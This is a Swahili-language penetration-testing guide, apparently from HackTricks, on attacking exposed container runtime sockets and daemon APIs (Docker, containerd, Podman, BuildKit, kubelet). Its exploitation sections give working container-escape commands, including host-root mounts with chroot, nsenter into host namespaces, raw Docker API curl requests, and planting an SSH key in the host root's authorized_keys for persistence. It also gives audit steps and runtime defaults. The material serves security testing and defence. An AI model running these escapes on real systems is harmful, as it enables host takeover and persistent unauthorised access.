# API ya Runtime na Uwazi wa Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Mashambulizi mengi halisi dhidi ya container hayaanzi kwa kutoroka namespace. Huanzia kwenye ufikiaji wa control plane ya runtime. Ikiwa workload inaweza kuwasiliana na `dockerd`, `containerd`, CRI-O, Podman, au kubelet kupitia Unix socket iliyowekwa ndani yake au TCP listener iliyo wazi, mshambuliaji anaweza kuomba container mpya yenye ruhusa za juu zaidi, kuweka filesystem ya host, kujiunga na host namespaces, au kupata taarifa nyeti za node. Katika hali hizo, runtime API ndiyo mpaka halisi wa usalama, na kuipenyeza ni sawa na kuipenyeza host.

Hii ndiyo sababu kufichua runtime socket kunapaswa kuandikwa tofauti na ulinzi wa kernel. Container yenye seccomp ya kawaida, capabilities, na MAC confinement bado inaweza kuwa umbali wa API call moja tu kutoka kwa kuathiriwa kwa host ikiwa `/var/run/docker.sock` au `/run/containerd/containerd.sock` imewekwa ndani yake. Kernel isolation ya container ya sasa inaweza kufanya kazi sawasawa na ilivyokusudiwa huku management plane ya runtime ikiwa wazi kabisa.

## Miundo ya Ufikiaji wa Daemon

Docker Engine kwa kawaida hufichua API yake yenye upendeleo kupitia Unix socket ya ndani kwenye `unix:///var/run/docker.sock`. Kihistoria, pia imefichuliwa kwa mbali kupitia TCP listeners kama `tcp://0.0.0.0:2375` au listener inayolindwa na TLS kwenye `2376`. Kufichua daemon kwa mbali bila TLS imara na uthibitishaji wa mteja kwa vitendo hugeuza Docker API kuwa kiolesura cha remote root.

containerd, CRI-O, Podman, na kubelet hufichua sehemu zenye athari kubwa zinazofanana. Majina na taratibu hutofautiana, lakini mantiki ni ileile. Ikiwa kiolesura kinamruhusu mpigaji kuunda workloads, kuweka host paths, kupata credentials, au kubadilisha containers zinazoendelea, basi ni njia ya usimamizi yenye upendeleo na inapaswa kushughulikiwa hivyo.

Kiolesura cha wavuti cha usimamizi wa container kinaweza kufichua mpaka huo huo bila kumpa akaunti ya ndani ufikiaji wa moja kwa moja wa socket. Kwa mfano, [Portainer issue #493](https://github.com/portainer/portainer/issues/493) iliandika kuhusu uwezekano wa mtu asiye na uthibitishaji kuweka upya nenosiri la msimamizi katika build ya zamani ya 1.11.1. Chukulia UI inayofikika ndani ya eneo husika kama mwongozo wa ukaguzi tu: thibitisha build iliyosakinishwa na tabia ya uthibitishaji, udhibiti halisi wa msimamizi, na kama endpoint inayosimamiwa nayo inaweza kuunda containers zenye host bind mount inayoweza kuandikwa. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket) kwamba usimamizi unaotegemea socket unahitaji ufikiaji wa Docker socket; endpoint ya rootless au yenye vizuizi hubadilisha athari kwa host. Usihitimishe kuwa kuna hitilafu ya uthibitishaji au ufikiaji wa root wa host kwa kutegemea jina la mchakato, port, au mfuatano wa toleo pekee.

Njia za kawaida za ndani zinazofaa kukaguliwa ni:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Mifumo ya zamani au maalumu zaidi inaweza pia kufichua endpoints kama `dockershim.sock`, `frakti.sock` au `rktlet.sock`. Hizi hazipatikani sana katika mazingira ya kisasa, lakini zikikutana nazo zinapaswa kushughulikiwa kwa tahadhari hiyo hiyo kwa sababu zinawakilisha maeneo ya udhibiti wa runtime badala ya soketi za kawaida za programu.

## Ufikiaji Salama wa Mbali

Ikiwa daemon lazima ifikiwe kutoka nje ya soketi ya ndani, muunganisho unapaswa kulindwa kwa TLS na ikiwezekana utumie uthibitishaji wa pande zote ili daemon ithibitishe mteja na mteja athibitishe daemon. Tabia ya zamani ya kufungua daemon ya Docker kwa HTTP ya kawaida kwa urahisi ni mojawapo ya makosa hatari zaidi katika usimamizi wa kontena, kwa sababu API yake ina uwezo wa kutosha kuunda kontena zenye upendeleo wa juu moja kwa moja.

Muundo wa kihistoria wa usanidi wa Docker ulionekana hivi:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Kwenye host zinazotumia systemd, mawasiliano ya daemon yanaweza pia kuonekana kama `fd://`, ikimaanisha kuwa mchakato hurithi socket iliyofunguliwa awali na systemd badala ya kuifungamanisha moja kwa moja. Jambo muhimu si sintaksia yenyewe, bali athari yake kwa usalama. Mara tu daemon inaposikiliza kwenye anwani nyingine isipokuwa socket ya ndani yenye ruhusa zilizodhibitiwa kwa ukali, usalama wa usafirishaji na uthibitishaji wa client huwa lazima, si hatua za hiari za kuimarisha usalama.

## Unyonyaji

Ikiwa socket ya runtime ipo, thibitisha ni ipi, kama kuna client inayooana, na kama ufikiaji wa HTTP au gRPC ghafi unawezekana:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Amri hizi ni muhimu kwa sababu zinatofautisha kati ya path iliyokufa, socket iliyowekwa lakini haiwezi kufikiwa, na API hai yenye mapendeleo ya juu. Ikiwa client inafanikiwa, swali linalofuata ni ikiwa API inaweza kuzindua container mpya yenye host bind mount au kushiriki host namespace.

### Wakati Hakuna Client Iliyosakinishwa

Kutokuwepo kwa `docker`, `podman`, au CLI nyingine rahisi kutumia hakumaanishi kuwa socket iko salama. Docker Engine hutumia HTTP kupitia Unix socket yake, na Podman hutoa API inayooana na Docker pamoja na API asilia ya Libpod kupitia `podman system service`. Hiyo inamaanisha kuwa mazingira madogo yenye `curl` pekee bado yanaweza kutosha kuendesha daemon:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Hili ni muhimu wakati wa post-exploitation kwa sababu wakati mwingine watetezi huondoa binary za kawaida za client lakini huacha socket ya usimamizi ikiwa ime-mountiwa. Kwenye host za Podman, kumbuka kuwa njia muhimu hutofautiana kati ya deployments za rootful na rootless: `unix:///run/podman/podman.sock` kwa service instances za rootful na `unix://$XDG_RUNTIME_DIR/podman/podman.sock` kwa zile za rootless.

### Mfano Kamili: Docker Socket Hadi Host Root

Ikiwa `docker.sock` inaweza kufikiwa, njia ya kawaida ya escape ni kuanzisha container mpya inayomount filesystem ya root ya host, kisha kutumia `chroot` kuingia ndani yake:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Hii hutoa utekelezaji wa moja kwa moja kwa ruhusa za root za host kupitia Docker daemon. Athari haziishii kwenye kusoma faili. Akishaingia kwenye container mpya, mshambulizi anaweza kubadilisha faili za host, kukusanya credentials, kuweka persistence, au kuanzisha workloads nyingine zenye ruhusa za juu.

### Mfano Kamili: Kutoka Docker Socket Hadi Host Namespaces

Ikiwa mshambulizi anapendelea kuingia kwenye namespaces badala ya kupata ufikiaji wa mfumo wa faili pekee:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Njia hii hufikia host kwa kuiomba runtime iunde container mpya yenye ufichuaji wa wazi wa host namespace, badala ya kutumia udhaifu kwenye container ya sasa.

### Docker Socket Persistence Pattern

Udhibiti wa runtime unaweza pia kutumika kwa persistence badala ya shell ya mara moja. Muundo wa jumla ni kuunda helper container yenye host mount, kuandika taarifa za ufikiaji zilizoidhinishwa au startup hook kwenye filesystem ya host iliyomountiwa, kisha kuthibitisha kuwa host inaitumia.

Mfano wa muundo:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Wazo hili hili linaweza kulenga systemd units, vipande vya cron, faili za kuanzisha programu, au funguo za SSH, kutegemea kile ambacho operator anataka kuthibitisha. Jambo muhimu ni kwamba mabadiliko yanayodumu hufanywa kupitia mamlaka ya daemon ya runtime kwenye mfumo wa faili wa host, si kupitia ruhusa za ziada kwenye container ya awali.

### Raw Docker API Helper Pivot

Docker CLI inapokosekana, mtiririko huohuo wa helper yenye host mount unaweza kuendeshwa kupitia HTTP kwenye Unix socket. Mtiririko wa jumla ni: thibitisha API, unda helper container yenye host bind mount, iwashe, unda exec instance, kisha uanzishe exec hiyo.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Ombi la mwisho la `/exec/<id>/start` hutegemea exec ID iliyorejeshwa, lakini hoja ya usalama haitegemei mpangilio halisi wa JSON: ufikiaji wa moja kwa moja wa API ya Docker daemon ya rootful unatosha kuomba helper workload yenye nguvu zaidi.

### Mfano Kamili: Socket ya containerd

Socket ya `containerd` iliyowekwa kwenye mount kwa kawaida ni hatari vilevile:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Ikiwa client inayofanana zaidi na Docker inapatikana, `nerdctl` inaweza kuwa rahisi zaidi kutumia kuliko `ctr` kwa sababu ina flags zinazofahamika kama `--privileged`, `--pid=host`, na `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Athari bado ni host compromise. Hata kama zana mahususi za Docker hazipo, API nyingine ya runtime bado inaweza kutoa mamlaka sawa ya kiutawala. Kwenye nodi za Kubernetes, `crictl` pia inaweza kutosha kwa reconnaissance na mwingiliano na containers, kwa kuwa inawasiliana moja kwa moja na endpoint ya CRI.

### Soketi ya BuildKit

Ni rahisi kupuuza `buildkitd` kwa sababu watu mara nyingi hudhani ni "backend ya build tu", lakini daemon bado ni control plane yenye mamlaka ya juu. `buildkitd.sock` inayoweza kufikiwa inaweza kumruhusu mshambulizi kuendesha hatua zozote za build, kukagua uwezo wa worker, kutumia contexts za ndani kutoka kwenye mazingira yaliyoathiriwa, na kuomba entitlements hatari kama `network.host` au `security.insecure` ikiwa daemon imesanidiwa kuziruhusu.

Mwingiliano wa awali unaofaa ni:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Ikiwa daemon inakubali maombi ya build, jaribu kuona kama insecure entitlements zinapatikana:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Athari halisi hutegemea usanidi wa daemon, lakini huduma ya BuildKit inayoendeshwa kama root na yenye entitlements zinazoruhusu mengi si urahisi usio na madhara kwa developer. Ichukulie kama sehemu nyingine muhimu ya kiutawala, hasa kwenye CI runners na nodi za build zinazotumiwa kwa pamoja.

### Kubelet API kupitia TCP

Kubelet si container runtime, lakini bado ni sehemu ya plane ya usimamizi wa nodi na mara nyingi huhusika katika majadiliano kuhusu mipaka ileile ya uaminifu. Ikiwa port salama ya kubelet `10250` inaweza kufikiwa kutoka kwenye workload, au ikiwa credentials za nodi, kubeconfigs, au haki za proxy zimefichuliwa, mshambulizi anaweza kuorodhesha Pods, kupata logs, au kutekeleza amri ndani ya containers za kwenye nodi bila hata kugusa njia ya udhibiti wa uandikishaji ya Kubernetes API server.

Anza kwa ugunduzi wa haraka:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Ikiwa njia ya kubelet au API-server proxy inaidhinisha `exec`, client inayoweza kutumia WebSocket inaweza kutumia hilo kutekeleza code kwenye containers nyingine za node. Hii pia ndiyo sababu `nodes/proxy` yenye ruhusa ya `get` pekee ni hatari zaidi kuliko inavyoonekana: ombi bado linaweza kufikia endpoints za kubelet zinazotekeleza amri, na mwingiliano huo wa moja kwa moja na kubelet hauonekani kwenye audit logs za kawaida za Kubernetes.<sup>[[2]](#references)</sup>

## Ukaguzi

Lengo la ukaguzi huu ni kujibu ikiwa container inaweza kufikia management plane yoyote ambayo ilipaswa kubaki nje ya trust boundary.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Mambo ya kuvutia hapa:

- Socket ya runtime iliyowekwa mara nyingi ni njia ya moja kwa moja ya kupata mamlaka ya kiutawala, badala ya kufichua taarifa tu.
- Listener ya TCP kwenye `2375` bila TLS inapaswa kuchukuliwa kuwa hali inayoweza kusababisha udukuzi wa mbali.
- Vigeu vya mazingira kama `DOCKER_HOST` mara nyingi hufichua kuwa workload iliundwa kimakusudi ili kuwasiliana na runtime ya host.

## Chaguomsingi za Runtime

| Runtime / platform | Hali chaguomsingi | Tabia chaguomsingi | Udhaifu wa kawaida unaoletwa kwa mikono |
| --- | --- | --- | --- |
| Docker Engine | Socket ya Unix ya ndani kwa chaguomsingi | `dockerd` husikiliza kwenye socket ya ndani na daemon kwa kawaida huendeshwa kwa root | kuweka `/var/run/docker.sock`, kufichua `tcp://...:2375`, TLS dhaifu au isiyokuwepo kwenye `2376` |
| Podman | CLI isiyotegemea daemon kwa chaguomsingi | Hakuna daemon ya muda mrefu yenye mamlaka ya juu inayohitajika kwa matumizi ya kawaida ya ndani; API sockets zinaweza bado kufichuliwa `podman system service` inapowashwa | kufichua `podman.sock`, kuendesha service kwa upana, kutumia API ya rootful |
| containerd | Socket ya ndani yenye mamlaka ya juu | API ya kiutawala hufichuliwa kupitia socket ya ndani na kwa kawaida hutumiwa na zana za kiwango cha juu | kuweka `containerd.sock`, ufikiaji mpana wa `ctr` au `nerdctl`, kufichua namespaces zenye mamlaka ya juu |
| CRI-O | Socket ya ndani yenye mamlaka ya juu | Endpoint ya CRI imekusudiwa kwa vipengele vinavyoaminika vilivyo kwenye node hiyo | kuweka `crio.sock`, kufichua endpoint ya CRI kwa workloads zisizoaminika |
| Kubernetes kubelet | API ya usimamizi ya ndani ya node | Kubelet haipaswi kufikiwa kwa upana kutoka kwa Pods; ufikiaji unaweza kufichua hali ya pod, credentials na vipengele vya utekelezaji kutegemea authn/authz | kuweka sockets au certs za kubelet, auth dhaifu ya kubelet, host networking pamoja na endpoint ya kubelet inayofikika |

## References

- [1] [Unyonyaji wa socket ya containerd sehemu ya 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Hatari za kukwepa Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
